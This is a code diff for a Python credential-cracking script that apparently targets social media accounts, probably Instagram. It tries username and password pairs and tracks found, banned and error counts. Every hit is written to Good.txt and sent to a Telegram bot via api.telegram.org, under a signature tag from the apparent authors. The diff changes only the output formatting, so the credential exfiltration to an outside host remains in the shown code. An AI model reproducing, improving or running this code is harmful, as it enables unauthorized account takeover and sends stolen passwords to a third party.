@@ -53,7 +53,7 @@ def login():
             at += 1
             av += 1
             time.sleep(0.50)
-            open("Good.txt","a").write(f"{username}\n {password} \n")
+            open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
             requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n 𝑷𝑯 ➪ : {username} \n - 𝑷𝑺 ➪ : {password} \n • 𝐅𝐫𝐎𝐦 : @YSYSD -Warrior- @VNVN6 ')
         elif '"message":"challenge_required","challenge"' in req:
             at += 1
@@ -62,6 +62,6 @@ def login():
         else:
             er += 1
             time.sleep(0.50)
-            print(f"\r {E}Username ⇝  : {username} | Found:{av} | {E}Password⇝  :{password} | Banned:{ban} | Error:{er}", end="")
+            print(f"\r {E}Username ⇝  : {username} | Found:{av} | {E}Password ⇝  :{password} | Banned:{ban} | Error:{er}", end="")
             
 login()
